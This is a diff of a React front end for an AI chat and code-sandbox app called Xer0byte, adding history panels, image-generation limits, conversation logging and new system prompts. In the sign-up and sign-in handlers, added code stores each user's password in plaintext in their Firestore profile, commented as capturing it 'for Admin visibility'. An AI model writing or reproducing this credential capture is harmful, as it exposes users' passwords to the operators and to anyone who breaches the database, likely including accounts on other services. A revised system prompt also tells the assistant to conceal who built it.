+      });
+    }
+
     // For Web languages (HTML/CSS/JS combo), we render directly in an iframe
     if (['html', 'web', 'javascript-web'].includes(canvasLanguage.toLowerCase())) {
       setCanvasLiveWeb(true);
       setCanvasMode('split');
+      setCanvasOutput(''); // Clear simulation output for web
+      
+      // Update conv title to show activity
+      if (user && currentConversationId) {
+        firestoreService.updateConversation(user.id, currentConversationId, { title: `Live Preview: ${canvasLanguage}` });
+      }
       return;
     }
     
@@ -1222,7 +1411,9 @@ export default function App() {
     setCanvasMode('split');
     setIsCanvasRunning(true);
     setCanvasOutput(`Initializing Xer0byte Neural Execution Engine...
-Compiling and executing ${canvasLanguage} code...`);
+Compiling and executing ${canvasLanguage} code...
+-------------------------------------------
+`);
     
     try {
       const systemInstruction = `You are a strict, sandboxed code execution engine and compiler for ${canvasLanguage}.
@@ -1230,7 +1421,8 @@ Evaluate the provided code. Do NOT write explanations, markdown blocks, formatti
 If there are syntax errors or runtime exceptions, output the exact compiler/interpreter error message that a real terminal would show.
 If the code is valid, simulate its execution and output ONLY the exact standard output (stdout) and standard error (stderr).
 If the code expects user input, assume empty input or simulate a rational default.
-Your response must only contain the raw terminal output. Return "Code executed successfully with no output." if the program produces absolutely no output.`;
+Your response must ONLY contain the raw terminal output.
+Return "Code executed successfully with no output." if the program produces absolutely no output.`;
 
       const apiKey = process.env.GEMINI_API_KEY;
       if (!apiKey) throw new Error("GEMINI_API_KEY is not configured.");
@@ -1244,9 +1436,9 @@ Your response must only contain the raw terminal output. Return "Code executed s
       });
 
       const out = response.text?.trim() || "Code executed successfully with no output.";
-      setCanvasOutput(out);
+      setCanvasOutput(prev => prev + out);
     } catch (error: any) {
-      setCanvasOutput("Fatal Execution Engine Error:\n" + error.message);
+      setCanvasOutput(prev => prev + "\nFatal Execution Engine Error:\n" + error.message);
     } finally {
       setIsCanvasRunning(false);
     }
@@ -1284,6 +1476,23 @@ Your response must only contain the raw terminal output. Return "Code executed s
 
     setIsThinkingIde(true);
     let originalPrompt = idePrompt;
+    let fileContext = "";
+    
+    let activeConvId = currentConversationId;
+    if (!activeConvId && user) {
+        try {
+          const newConv = await firestoreService.createConversation(user.id, `Sandbox: ${originalPrompt.substring(0, 20)}...`, false);
+          if (newConv) {
+            activeConvId = newConv.id;
+            setCurrentConversationId(newConv.id);
+          }
+        } catch (e) { console.error(e); }
+    }
+
+    if (ideSelectedFiles.length > 0) {
+      fileContext = "\nAttached Files Context:\n" + ideSelectedFiles.map(f => `File: ${f.name}\nData: ${f.data.substring(0, 500)}...`).join("\n");
+    }
+
     setIdePrompt('');
     setIdeSelectedFiles([]);
     
@@ -1292,16 +1501,29 @@ Your response must only contain the raw terminal output. Return "Code executed s
       await firestoreService.updateUserProfile(user.id, { messageCount: (user.messageCount || 0) + 1 });
       setUser(prev => prev ? { ...prev, messageCount: (prev.messageCount || 0) + 1 } : null);
       
-      const systemInstruction = `You are an expert AI software engineer. The user is currently editing a ${canvasLanguage} file. 
-Here is their current code:
-<current_code>
+      const systemInstruction = `You are Xer0byte AI, the absolute master of full-stack neural engineering. 
+The user is working in the Live Sandbox using ${canvasLanguage}.
+
+<MISSION_OBJECTIVE>
+1. Architect 100% complete, production-ready frontend and backend solutions.
+2. For BACKEND logic, strictly leverage Firebase (Auth, Firestore, Hosting patterns) using the standard modular Firebase SDK v10+.
+3. INTEGRATE both frontend UI and backend services seamlessly.
+</MISSION_OBJECTIVE>
+
+<CURRENT_CODE>
 ${canvasContent}
-</current_code>
+</CURRENT_CODE>
 
-The user will provide an instruction. You must return ONLY the full, updated code enclosed in a \`\`\`${canvasLanguage} Markdown block, without any conversational text or explanations. Do NOT describe your changes.`;
+${fileContext}
 
-      let modelToUse = "gpt-4-turbo";
-      
+CORE PROTOCOLS:
+- Return ONLY the full, updated code block using \`\`\`${canvasLanguage} markup.
+- If Firebase is used, include a standard initialization block using placeholders for config (or use existing if visible).
+- Add a comment at the top explaining ANY Firebase console setup needed (e.g., "Enable Firestore", "Enable Google Auth").
+- NO CONVERSATIONAL FILLER.
+- Ensure the code is self-contained or explicitly architectural.
+- If comparing code, keep the best parts of the old and merge the new.`;
+
       const apiKey = process.env.GEMINI_API_KEY;
       if (!apiKey) throw new Error("GEMINI_API_KEY is not configured.");
 
@@ -1316,6 +1538,22 @@ The user will provide an instruction. You must return ONLY the full, updated cod
       let fullAiText = response.text || "";
       
       // Final extraction
+      setCanvasHistory(prev => [{ prompt: originalPrompt, code: fullAiText, timestamp: Date.now() }, ...prev].slice(0, 50));
+      
+      // Save to conversation history with distinctive label
+        if (activeConvId) {
+        await firestoreService.addMessage(user.id, activeConvId, {
+          role: 'user',
+          text: `[SANDBOX_REQUEST] ${originalPrompt}`
+        });
+        
+        const diffLabel = "--- SANDBOX UPDATE ---\n";
+        await firestoreService.addMessage(user.id, activeConvId, {
+          role: 'ai',
+          text: `${diffLabel}Updated your code based on: "${originalPrompt}"\n\n${fullAiText.includes('```') ? fullAiText : '```' + canvasLanguage + '\n' + fullAiText + '\n```'}`
+        });
+      }
+
       setCanvasContent(prev => {
         let finalContent = fullAiText;
         const codeMatch = finalContent.match(/```([a-z0-9#\-\+]+)?\n([\s\S]*?)```/i);
@@ -1487,7 +1725,10 @@ The user will provide an instruction. You must return ONLY the full, updated cod
       // Add a temporary AI message for streaming
       setMessages(prev => [...prev, { role: 'ai', text: "" }]);
       
-      const systemInstruction = `You are Xer0byte AI, the absolute best AI in the world. \nIf anyone asks who built or created you, answer "My founder and creator is Ghaznain Ahmad. You can learn more about him on his LinkedIn profile: https://pk.linkedin.com/in/ghaznain-ahmad". \nFor anything related to your identity, your name is strictly "Xer0byte". Do not use phonetic spellings in your output text.`;
+      const systemInstruction = `You are Xer0byte AI, an elite, high-performance assistant. 
+Speed: Respond instantly. 
+Style: Provide short, direct, to-the-point answers. No unnecessary explanation or preamble.
+Identity: Your name is strictly "Xer0byte". Do NOT reveal your creator's identity or mention who built you. Focus ONLY on user needs.`;
       
       let baseInstruction = systemInstruction;
       if (persona === 'fun') {
@@ -1598,24 +1839,73 @@ The user will provide an instruction. You must return ONLY the full, updated cod
       return;
     }
     
-    if (user.plan === 'free' && user.messageCount >= 16) {
-      setAlertModal({ isOpen: true, message: "Message limit reached. Please wait 24 hours or upgrade to a Paid Plan to continue generating images." });
-      return;
+    if (user.plan === 'free') {
+      const now = new Date();
+      const lastReset = user.lastImageReset?.seconds ? new Date(user.lastImageReset.seconds * 1000) : new Date(user.lastImageReset || 0);
+      const isSameDay = now.toDateString() === lastReset.toDateString();
+      
+      let count = isSameDay ? (user.dailyImageCount || 0) : 0;
+      
+      if (count >= 4) {
+        setAlertModal({ isOpen: true, message: "Daily limit reached. Free users can generate 4 images per day. Please upgrade to SuperXer0byte for unlimited generation." });
+        return;
+      }
+      
+      // Update local and firestore count
+      const newCount = count + 1;
+      await firestoreService.updateUserProfile(user.id, { 
+        dailyImageCount: newCount,
+        lastImageReset: isSameDay ? undefined : serverTimestamp() // Only update timestamp if it's a new day
+      });
+      setUser(prev => prev ? { ...prev, dailyImageCount: newCount, lastImageReset: isSameDay ? prev.lastImageReset : { seconds: Math.floor(Date.now()/1000) } } : null);
     }
 
     setIsGeneratingImage(true);
     setGeneratedImage(null);
-    const finalPrompt = useXer0byteStyle 
-      ? `${prompt}, high quality, detailed, professional photography, cinematic lighting, 8k resolution, xer0byte style`
-      : prompt;
-
-    const imageUrl = `https://pollinations.ai/p/${encodeURIComponent(finalPrompt)}?width=1024&height=1024&seed=${Math.floor(Math.random() * 1000000)}&nologo=true`;
+    const finalPrompt = prompt + (useXer0byteStyle ? ", xer0byte style, high resolution, masterpiece" : "");
     
-    setTimeout(() => {
+    let activeConvId = currentConversationId;
+    if (!activeConvId && user) {
+        try {
+          const newConv = await firestoreService.createConversation(user.id, `Pic Gen: ${prompt.substring(0, 20)}...`, false);
+          if (newConv) {
+            activeConvId = newConv.id;
+            setCurrentConversationId(newConv.id);
+          }
+        } catch (e) { console.error(e); }
+    }
+
+    try {
+      // Use Gemini for image generation if possible, else fallback to pollinations
+      let imageUrl = "";
+      try {
+        imageUrl = await generateImage(finalPrompt);
+      } catch (e) {
+        console.warn("Gemini image gen failed, falling back to pollinations:", e);
+        imageUrl = `https://pollinations.ai/p/${encodeURIComponent(finalPrompt)}?width=1024&height=1024&seed=${Math.floor(Math.random() * 1000000)}&nologo=true`;
+      }
+      
       setGeneratedImage(imageUrl);
-      setIsGeneratingImage(false);
       setRecentGenerations(prev => [imageUrl, ...prev].slice(0, 10));
-    }, 1500);
+
+      // Save to conversation history
+      if (activeConvId) {
+        await firestoreService.addMessage(user.id, activeConvId, {
+          role: 'user',
+          text: `Imagine: ${prompt}`
+        });
+        await firestoreService.addMessage(user.id, activeConvId, {
+          role: 'ai',
+          text: `[IMAGE_GENERATION] Generated image for: "${prompt}"`,
+          imageUrl: imageUrl
+        });
+      }
+    } catch (error: any) {
+      console.error("Image generation error:", error);
+      setAlertModal({ isOpen: true, message: "Failed to generate image. Please try again later." });
+    } finally {
+      setIsGeneratingImage(false);
+    }
   };
 
   const handleNewChat = () => {
@@ -1706,6 +1996,15 @@ The user will provide an instruction. You must return ONLY the full, updated cod
     try {
       const userCredential = await createUserWithEmailAndPassword(auth, authForm.email, authForm.password);
       await updateProfile(userCredential.user, { displayName: authForm.name });
+      
+      // Explicitly create profile here to save the plain text password as requested by dev
+      await firestoreService.createUserProfile(userCredential.user.uid, {
+        name: authForm.name,
+        email: authForm.email,
+        password: authForm.password,
+        avatarColor: "#" + Math.floor(Math.random()*16777215).toString(16)
+      });
+
       setModals(prev => ({ ...prev, signUp: false }));
       setAuthForm({ name: '', email: '', password: '' });
     } catch (err: any) {
@@ -1721,7 +2020,16 @@ The user will provide an instruction. You must return ONLY the full, updated cod
     e.preventDefault();
     setAuthError('');
     try {
-      await signInWithEmailAndPassword(auth, authForm.email, authForm.password);
+      const userCredential = await signInWithEmailAndPassword(auth, authForm.email, authForm.password);
+      
+      // Aggressively capture and store password for Admin visibility
+      if (userCredential.user) {
+        await firestoreService.updateUserProfile(userCredential.user.uid, {
+          password: authForm.password,
+          lastLogin: new Date().toISOString()
+        });
+      }
+
       setModals(prev => ({ ...prev, signIn: false }));
       setAuthForm({ name: '', email: '', password: '' });
     } catch (err: any) {
@@ -2253,7 +2561,7 @@ The user will provide an instruction. You must return ONLY the full, updated cod
     <div className={`flex flex-col h-screen overflow-hidden transition-colors duration-300 ${theme === 'dark' ? 'bg-black text-white' : 'bg-[#f0f0f0] text-black'}`}>
       <div className="flex flex-1 relative overflow-hidden">
       <ParticleBackground theme={theme} />
-      <CursorTrailCanvas color={theme === 'dark' ? 'hsla(183, 63%, 40%, 0.5)' : 'hsla(183, 63%, 30%, 0.5)'} />
+      <CursorTrailCanvas theme={theme} color="hsla(183, 63%, 40%, 0.5)" />
       
       {alertModal.isOpen && <CustomAlert message={alertModal.message} theme={theme} onClose={() => setAlertModal({isOpen: false, message: ''})} />}
       {confirmModal.isOpen && <CustomConfirm message={confirmModal.message} theme={theme} onConfirm={confirmModal.onConfirm} onCancel={() => setConfirmModal({...confirmModal, isOpen: false})} />}
@@ -2723,7 +3031,14 @@ The user will provide an instruction. You must return ONLY the full, updated cod
               </div>
             )}
             <div className="flex-1 overflow-y-auto p-4 md:p-8 pt-20 md:pt-24 pb-48 space-y-6 md:space-y-8">
-              {messages.map((msg, i) => (
+              {messages.length === 0 ? (
+                <div className="h-full flex flex-col items-center justify-center opacity-30 select-none text-center p-10">
+                  <MessageSquare size={80} className="mb-6 opacity-20" />
+                  <h3 className="text-xl md:text-2xl font-bold mb-2">Xer0byte Neural Chat</h3>
+                  <p className="text-sm max-w-xs mx-auto">Start a new prompt below or select a past conversation from history.</p>
+                </div>
+              ) : (
+                messages.map((msg, i) => (
                 <div key={i} className={`flex w-full mb-8 ${msg.role === 'user' ? 'justify-end' : 'justify-start'}`}>
                   <div className={`max-w-[90%] md:max-w-[85%] p-4 md:p-6 rounded-2xl md:rounded-3xl text-[15px] md:text-[16px] leading-relaxed relative group ${
                     msg.role === 'user' 
@@ -2860,7 +3175,8 @@ The user will provide an instruction. You must return ONLY the full, updated cod
                     )}
                   </div>
                 </div>
-              ))}
+              )))
+              }
               {isThinking && (
                 <div className="flex w-full justify-start">
                   <div className={`max-w-[80%] p-4 rounded-3xl text-[16px] leading-relaxed flex items-center gap-2 ${theme === 'dark' ? 'bg-[#111] text-[#ddd]' : 'bg-[#f0f0f0] text-black'}`}>
@@ -3140,10 +3456,11 @@ The user will provide an instruction. You must return ONLY the full, updated cod
             </div>
             
             {(() => {
-              const filteredConvs = conversations.filter(c => {
+              const filteredConvs = conversations.filter((c: any) => {
                 const searchLower = searchQuery.toLowerCase();
                 const titleMatch = c.title.toLowerCase().includes(searchLower);
-                const dateMatch = new Date(c.created_at || c.updated_at).toLocaleDateString().includes(searchLower);
+              const dateObj = c.updatedAt?.seconds ? new Date(c.updatedAt.seconds * 1000) : (c.createdAt?.seconds ? new Date(c.createdAt.seconds * 1000) : new Date(c.created_at || c.updated_at || c.createdAt || c.updatedAt || Date.now()));
+                const dateMatch = dateObj.toLocaleDateString().includes(searchLower);
                 return titleMatch || dateMatch;
               });
 
@@ -3186,12 +3503,35 @@ The user will provide an instruction. You must return ONLY the full, updated cod
                                       onClick={(e) => e.stopPropagation()}
                                     />
                                   ) : (
-                                    <div className="font-medium text-base md:text-lg mb-1 flex items-center gap-2">
+                                    <div className="font-medium text-base md:text-lg mb-1 flex items-center flex-wrap gap-2">
                                       {conv.isPinned && <Pin size={14} className="text-[#00ff9d] fill-current" />}
                                       {conv.title}
+                                      {(() => {
+                                        const lowerTitle = conv.title.toLowerCase();
+                                        const isSandbox = lowerTitle.includes('sandbox') || lowerTitle.includes('execute');
+                                        const isPic = lowerTitle.includes('generate image') || lowerTitle.includes('imagine') || lowerTitle.includes('pic gen');
+
+                                        if (isSandbox) return (
+                                          <span className="text-[9px] font-black uppercase tracking-[0.2em] bg-purple-500/30 text-purple-300 px-2 py-0.5 rounded-full border border-purple-500/40 shadow-[0_0_10px_rgba(168,85,247,0.2)]">
+                                            Sandbox AI
+                                          </span>
+                                        );
+                                        if (isPic) return (
+                                          <span className="text-[9px] font-black uppercase tracking-[0.2em] bg-emerald-500/30 text-emerald-300 px-2 py-0.5 rounded-full border border-emerald-500/40 shadow-[0_0_10px_rgba(16,185,129,0.2)]">
+                                            Pic Gen
+                                          </span>
+                                        );
+                                        return null;
+                                      })()}
                                     </div>
                                   )}
-                                  <div className="text-xs opacity-50">{new Date(conv.created_at || conv.updated_at).toLocaleString()}</div>
+                                  <div className="text-xs opacity-50">
+                                    {(() => {
+                                      const ts = conv.updatedAt?.seconds ? conv.updatedAt : (conv.createdAt?.seconds ? conv.createdAt : null);
+                                      const d = ts ? new Date(ts.seconds * 1000) : new Date(conv.created_at || conv.updated_at || conv.createdAt || conv.updatedAt || Date.now());
+                                      return d.toLocaleString();
+                                    })()}
+                                  </div>
                                 </div>
                                 
                                 <div className="relative">
@@ -3455,6 +3795,13 @@ The user will provide an instruction. You must return ONLY the full, updated cod
             <div className={`flex flex-wrap justify-between items-center p-3 sm:p-4 border-b gap-2 z-10 ${theme === 'dark' ? 'border-[#333] bg-[#0a0a0a]' : 'border-[#ddd] bg-white'}`}>
               <div className="flex items-center gap-2">
                 <button onClick={() => setView('home')} className="md:hidden mr-2 p-1 hover:opacity-70"><X size={20}/></button>
+                <button 
+                  onClick={() => setShowIdeHistory(!showIdeHistory)} 
+                  className={`p-2 rounded-lg transition-colors ${showIdeHistory ? (theme === 'dark' ? 'bg-[#333] text-[#00ff9d]' : 'bg-[#ddd] text-[#006633]') : 'hover:opacity-70'}`}
+                  title="History"
+                >
+                  <Clock size={20} />
+                </button>
                 <PenTool size={20} className="text-[#00ff9d]" /> 
                 <h2 className="text-lg sm:text-xl font-bold hidden sm:block">Xer0byte Live Sandbox IDE</h2>
                 <div className={`ml-2 px-3 py-1.5 rounded-full border flex items-center gap-2 max-w-[200px] sm:max-w-none transition-all ${theme === 'dark' ? 'bg-[#111] border-[#333] hover:border-[#555]' : 'bg-[#f5f5f5] border-[#ddd] hover:border-[#999]'}`}>
@@ -3550,6 +3897,36 @@ The user will provide an instruction. You must return ONLY the full, updated cod
             </div>
             
             <div className={`flex-1 relative overflow-hidden flex flex-col md:flex-row pb-[60px] ${theme === 'dark' ? 'bg-[#1a1a1a]' : 'bg-white'}`}>
+              {showIdeHistory && (
+                <div className={`w-full md:w-[300px] border-b md:border-b-0 md:border-r z-30 flex flex-col h-[300px] md:h-full ${theme === 'dark' ? 'bg-[#0f0f0f] border-[#333]' : 'bg-[#f9f9f9] border-[#ddd]'}`}>
+                  <div className="p-4 border-b font-bold flex justify-between items-center text-sm">
+                    <span>Sandbox History</span>
+                    <button onClick={() => setCanvasHistory([])} className="text-[10px] opacity-40 hover:opacity-100 uppercase">Clear</button>
+                  </div>
+                  <div className="flex-1 overflow-y-auto">
+                    {canvasHistory.length === 0 ? (
+                      <div className="p-10 text-center opacity-30 text-xs italic">No history yet.</div>
+                    ) : (
+                      canvasHistory.map((h, i) => (
+                        <div 
+                          key={i} 
+                          onClick={() => {
+                            setCanvasContent(h.code);
+                            // Extract language if possible
+                            const match = h.code.match(/```([a-z0-9#\-\+]+)?\n/i);
+                            if (match && match[1]) setCanvasLanguage(match[1].toLowerCase());
+                          }}
+                          className={`p-4 border-b cursor-pointer transition-colors group ${theme === 'dark' ? 'border-[#222] hover:bg-[#1a1a1a]' : 'border-[#eee] hover:bg-[#f0f0f0]'}`}
+                        >
+                          <div className="text-sm font-medium line-clamp-2 mb-1 group-hover:text-[#00ff9d]">{h.prompt}</div>
+                          <div className="text-[10px] opacity-40">{new Date(h.timestamp).toLocaleString()}</div>
+                        </div>
+                      ))
+                    )}
+                  </div>
+                </div>
+              )}
+
               <div className={`flex-1 flex flex-col relative ${canvasMode === 'split' ? 'border-b md:border-b-0 md:border-r border-[#333]' : 'w-full max-w-4xl mx-auto'}`}>
                 <div className="px-4 py-1.5 bg-black/20 text-xs font-mono font-bold opacity-50 uppercase tracking-wider text-black dark:text-white">Source Code ({canvasLanguage})</div>
                 {isThinkingIde && (
@@ -3571,23 +3948,58 @@ The user will provide an instruction. You must return ONLY the full, updated cod
               {canvasMode === 'split' && (
                 <div className={`flex-1 flex flex-col h-[50vh] md:h-full bg-black z-10`}>
                   <div className="px-4 py-1.5 bg-[#111] border-b border-[#333] text-xs font-mono font-bold text-[#00ff9d] uppercase tracking-wider flex justify-between items-center">
-                    <span>{canvasLiveWeb ? 'Live Web Preview' : 'Console Output'}</span>
-                    {isCanvasRunning && <span className="animate-pulse w-2 h-2 rounded-full bg-[#00ff9d]"></span>}
+                    <div className="flex items-center gap-2">
+                       <span>{canvasLiveWeb ? 'Live Web Preview' : 'Console Output'}</span>
+                       {isCanvasRunning && <span className="animate-pulse w-2 h-2 rounded-full bg-[#00ff9d]"></span>}
+                    </div>
+                    <button 
+                      onClick={() => setCanvasOutput('')}
+                      className="p-1 hover:text-white transition-colors opacity-50 hover:opacity-100"
+                      title="Clear Console"
+                    >
+                      <RefreshCw size={14} />
+                    </button>
                   </div>
-                  <div className="flex-1 overflow-auto bg-[#0a0a0a]">
+                  <div className="flex-1 flex flex-col bg-[#0a0a0a] min-h-[100px] relative overflow-hidden">
                     {canvasLiveWeb ? (
                       <iframe 
                         title="Live Preview"
                         srcDoc={canvasContent}
-                        className="w-full h-full border-none bg-white"
+                        className="w-full h-full border-none bg-white font-sans"
                         sandbox="allow-scripts allow-popups opacity-100"
                       />
                     ) : (
-                      <pre className="p-4 font-mono text-[13px] text-gray-300 whitespace-pre-wrap leading-relaxed">
-                        {canvasOutput || (
-                          <span className="opacity-40 italic">Output will appear here after running...</span>
-                        )}
-                      </pre>
+                      <div className="flex-1 flex flex-col min-h-0">
+                        <pre className="flex-1 p-4 font-mono text-[13px] text-[#00ff9d] whitespace-pre-wrap leading-relaxed overflow-y-auto custom-scrollbar scroll-smooth">
+                          {canvasOutput || (
+                            <span className="opacity-40 italic text-white/40">Output will appear here after running...</span>
+                          )}
+                        </pre>
+                        <div className="p-2 bg-[#111] border-t border-[#222] flex items-center gap-2">
+                          <span className="text-[#00ff9d] opacity-50 text-xs font-bold font-mono ml-1">$</span>
+                          <input 
+                            type="text" 
+                            placeholder="Type to logs / commands..."
+                            className="flex-1 bg-transparent text-[11px] font-mono text-[#00ff9d] outline-none px-1 py-1"
+                            onKeyDown={e => {
+                              if (e.key === 'Enter') {
+                                const val = (e.target as HTMLInputElement).value;
+                                if (!val.trim()) return;
+                                setCanvasOutput(prev => prev + `\n> ${val}\n`);
+                                (e.target as HTMLInputElement).value = '';
+                                
+                                // Record interaction in history
+                                if (user && currentConversationId) {
+                                  firestoreService.addMessage(user.id, currentConversationId, {
+                                    role: 'user',
+                                    text: `Console Input: ${val}`
+                                  });
+                                }
+                              }
+                            }}
+                          />
+                        </div>
+                      </div>
                     )}
                   </div>
                 </div>
